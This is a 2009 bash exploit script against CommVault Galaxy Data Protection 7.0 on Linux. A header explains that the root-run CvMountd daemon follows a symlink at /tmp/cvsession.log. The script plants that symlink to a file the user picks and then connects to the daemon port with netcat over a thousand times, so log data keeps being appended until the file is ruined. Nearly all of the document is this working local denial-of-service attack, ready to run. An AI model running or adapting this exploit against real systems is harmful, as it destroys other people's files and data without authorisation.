#!/bin/bash
#
# cv_trashfiles.sh by cenobyte 28/05/2009
#
# CommVault Galaxy Data Protection 7.0 local Linux DOS
#
# Synopsis:
# CvMountd allows local users to append log entries to any arbitrary file via
# a symlink attack.
#
# Problem description:
# When /tmp/cvsession.log exists CvMountd will append incoming TCP connection
# information to that file. Unfortunately CvMountd runs as root and follows
# symlinks thus making it possible to append log data to any file on the file
# system which the local user can find.
#
# Exploit description:
# A TCP connection needs to be initiated to the CvMountd port to trigger the
# log appending part. CommVault does not use a static CvMountd port and
# arbitrarily chooses one during CommVault start. Use cv_findCvMountdports.sh
# to find port CvMountd is listening on.

cvsession="/tmp/cvsession.log"
netcat="/usr/bin/nc"
ln="/bin/ls"

function usage() {
	echo "usage: $0 <file to trash> <CvMountd port>"
	exit 1
}

if [ ! -x $netcat ]; then
	echo "error: cannot execute $netcat"
	exit 1
fi

if [ -z $2 ]; then
	usage
fi

if [ ! -f $1 ]; then
	echo "error: cannot open $1"
	exit 1
fi

echo "CommVault Galaxy Data Protection 7.0 local Linux DOS exploit"
echo

cvmountdport=$(echo -n $2 | tr -d '[0-9]')
[[ $cvmountdport ]] && usage

pre=$(stat --format "%s" $1)

ln -s $1 $cvsession

echo 0 | $netcat localhost $2 > /dev/null 2>&1

post=$(stat --format "%s" $1)

if [ $pre -eq $post ]; then
	echo "error: $1 size has not grown, something went wrong"
	rm -f $cvsession
	exit 1
else
	echo -n "trashing started... "
	for((i = 0; i < 1024; i++)); do
		echo 0 | $netcat localhost $2 > /dev/null 2>&1
	done
fi

rm -f $cvsession

echo "done"
